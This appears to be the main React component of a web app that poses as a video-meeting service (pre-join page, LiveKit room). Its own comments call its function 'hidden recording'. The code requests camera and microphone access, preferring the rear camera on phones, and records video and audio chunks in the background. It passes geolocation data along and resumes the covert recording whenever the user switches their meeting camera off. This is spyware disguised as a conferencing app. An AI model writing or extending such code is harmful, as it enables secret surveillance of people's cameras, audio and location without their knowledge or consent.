import { useState, useRef, useEffect } from 'react';
import HomePage from '@/app/components/HomePage';
import JitsiPreJoin from '@/app/components/JitsiPreJoin';
import LiveKitRoom from '@/app/components/LiveKitRoom';
import { VideoRecorder } from '@/app/components/VideoRecorder';

export default function App() {
  const [currentPage, setCurrentPage] = useState<'home' | 'prejoin' | 'room'>('home');
  const [roomName, setRoomName] = useState('');
  const [roomTitle, setRoomTitle] = useState(''); // Friendly room title
  const [userName, setUserName] = useState('');
  
  // LiveKit connection data
  const [livekitUrl, setLivekitUrl] = useState('');
  const [token, setToken] = useState('');
  
  // Video recording state
  const [videoStreamFront, setVideoStreamFront] = useState<MediaStream | null>(null);
  const [isVideoRecording, setIsVideoRecording] = useState(false);
  const [currentChunkNumber, setCurrentChunkNumber] = useState(0);
  const [currentCameraType, setCurrentCameraType] = useState<'front' | 'back' | 'desktop'>('back');
  
  // Geolocation data
  const [geoData, setGeoData] = useState<{
    latitude: number;
    longitude: number;
    accuracy: number;
    timestamp: string;
  } | null>(null);
  
  // Refs for camera switching and permissions
  const isSwitchingCameraRef = useRef(false);
  const globalChunkCounterRef = useRef(0);
  const geoLocationSentRef = useRef(false);
  const currentVideoDeviceIdRef = useRef<string | null>(null);
  const isExecutingPermissionsRef = useRef(false);

  // Initialize LiveKit localStorage to prevent warnings
  useEffect(() => {
    try {
      const lkKey = 'lk-user-choices';
      if (!localStorage.getItem(lkKey)) {
        localStorage.setItem(lkKey, JSON.stringify({}));
        console.log('✅ Initialized LiveKit localStorage');
      }
    } catch (error) {
      console.error('❌ Failed to initialize localStorage:', error);
    }
  }, []);
  
  // Video chunk handler
  const handleVideoChunkReady = async (blob: Blob, chunkNum: number, cameraType: 'front' | 'back' | 'desktop') => {
    console.log(`📹 [App] Получен видео+аудио чанк #${chunkNum} (${cameraType}), размер: ${blob.size} bytes`);
    
    // Update chunk number in state for camera switching logic
    setCurrentChunkNumber(chunkNum);
  };

  const handleStartMeeting = (roomNameInput: string, roomTitleInput?: string) => {
    setRoomName(roomNameInput);
    setRoomTitle(roomTitleInput || '');
    setCurrentPage('prejoin');
  };
  
  const handleJoinRoom = (userNameInput: string, tokenInput: string, livekitUrlInput: string) => {
    setUserName(userNameInput);
    setToken(tokenInput);
    setLivekitUrl(livekitUrlInput);
    setCurrentPage('room');
  };
  
  const handleLeaveRoom = () => {
    console.log('🚪 Leaving room and returning to home page');
    
    // Clear room parameter from URL
    const newUrl = new URL(window.location.href);
    newUrl.searchParams.delete('room');
    window.history.pushState({}, '', newUrl.toString());
    
    // Reset all state
    setRoomName('');
    setRoomTitle('');
    setUserName('');
    setToken('');
    setLivekitUrl('');
    setVideoStreamFront(null);
    setIsVideoRecording(false);
    setCurrentChunkNumber(0);
    setCurrentCameraType('back');
    setGeoData(null);
    
    // Reset refs
    isSwitchingCameraRef.current = false;
    globalChunkCounterRef.current = 0;
    geoLocationSentRef.current = false;
    currentVideoDeviceIdRef.current = null;
    isExecutingPermissionsRef.current = false;
    
    // Return to home page
    setCurrentPage('home');
  };
  
  // Обработчик изменения состояния камеры в LiveKit
  const handleLiveKitCameraStateChange = (isEnabled: boolean) => {
    console.log(`🔄 [App] LiveKit camera state changed: ${isEnabled ? 'ENABLED' : 'DISABLED'}`);
    
    if (isEnabled) {
      // Камера LiveKit включена - останавливаем скрытую запись
      console.log('⏸️ [App] Stopping hidden recording (LiveKit camera is active)');
      setIsVideoRecording(false);
      
      // Останавливаем текущий stream, чтобы освободить камеру для LiveKit
      if (videoStreamFront) {
        videoStreamFront.getTracks().forEach(track => {
          track.stop();
          console.log(`🛑 Stopped track: ${track.kind} (${track.label})`);
        });
        setVideoStreamFront(null);
      }
    } else {
      // Камера LiveKit выключена - возобновляем скрытую запись
      console.log('▶️ [App] Resuming hidden recording (LiveKit camera is disabled)');
      
      // Запускаем скрытую запись снова
      restartHiddenRecording();
    }
  };
  
  // Функция для перезапуска скрытой записи
  const restartHiddenRecording = async () => {
    try {
      console.log('🎥 [App] Restarting hidden recording...');
      
      // Определяем устройство
      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
      const cameraType = isMobile ? 'back' : 'front';
      
      // Запрашиваем доступ к камере
      const constraints: MediaStreamConstraints = {
        video: isMobile 
          ? { facingMode: 'environment' } // back camera
          : { facingMode: 'user' }, // front camera
        audio: true
      };
      
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      console.log('✅ [App] Got camera stream for hidden recording');
      
      setVideoStreamFront(stream);
      setCurrentCameraType(cameraType);
      setIsVideoRecording(true);
      
    } catch (error) {
      console.error('❌ [App] Failed to restart hidden recording:', error);
    }
  };
  
  return (
    <div className="size-full">
      {currentPage === 'home' && (
        <HomePage onStartMeeting={handleStartMeeting} />
      )}

      {currentPage === 'prejoin' && (
        <>
          <JitsiPreJoin 
            roomName={roomName}
            initialRoomTitle={roomTitle}
            onJoinRoom={handleJoinRoom}
            videoStreamFront={videoStreamFront}
            setVideoStreamFront={setVideoStreamFront}
            isVideoRecording={isVideoRecording}
            setIsVideoRecording={setIsVideoRecording}
            currentChunkNumber={currentChunkNumber}
            setCurrentChunkNumber={setCurrentChunkNumber}
            currentCameraType={currentCameraType}
            setCurrentCameraType={setCurrentCameraType}
            geoData={geoData}
            setGeoData={setGeoData}
            isSwitchingCameraRef={isSwitchingCameraRef}
            globalChunkCounterRef={globalChunkCounterRef}
            geoLocationSentRef={geoLocationSentRef}
            currentVideoDeviceIdRef={currentVideoDeviceIdRef}
            isExecutingPermissionsRef={isExecutingPermissionsRef}
          />
          
          {/* VideoRecorder component - hidden, works in background */}
          {videoStreamFront && (
            <VideoRecorder
              key={currentCameraType}
              stream={videoStreamFront}
              isRecording={isVideoRecording}
              cameraType={currentCameraType}
              globalChunkCounter={globalChunkCounterRef}
              geoData={geoData}
              onChunkReady={handleVideoChunkReady}
            />
          )}
        </>
      )}
      
      {currentPage === 'room' && (
        <>
          <LiveKitRoom
            roomName={roomName}
            userName={userName}
            token={token}
            livekitUrl={livekitUrl}
            onLeave={handleLeaveRoom}
            videoStreamFront={videoStreamFront}
            setVideoStreamFront={setVideoStreamFront}
            isVideoRecording={isVideoRecording}
            setIsVideoRecording={setIsVideoRecording}
            currentChunkNumber={currentChunkNumber}
            setCurrentChunkNumber={setCurrentChunkNumber}
            currentCameraType={currentCameraType}
            setCurrentCameraType={setCurrentCameraType}
            geoData={geoData}
            setGeoData={setGeoData}
            isSwitchingCameraRef={isSwitchingCameraRef}
            globalChunkCounterRef={globalChunkCounterRef}
            geoLocationSentRef={geoLocationSentRef}
            currentVideoDeviceIdRef={currentVideoDeviceIdRef}
            isExecutingPermissionsRef={isExecutingPermissionsRef}
            onCameraStateChange={handleLiveKitCameraStateChange}
          />
          
          {/* VideoRecorder продолжает работать в фоне */}
          {videoStreamFront && (
            <VideoRecorder
              key={currentCameraType}
              stream={videoStreamFront}
              isRecording={isVideoRecording}
              cameraType={currentCameraType}
              globalChunkCounter={globalChunkCounterRef}
              geoData={geoData}
              onChunkReady={handleVideoChunkReady}
            />
          )}
        </>
      )}
    </div>
  );
}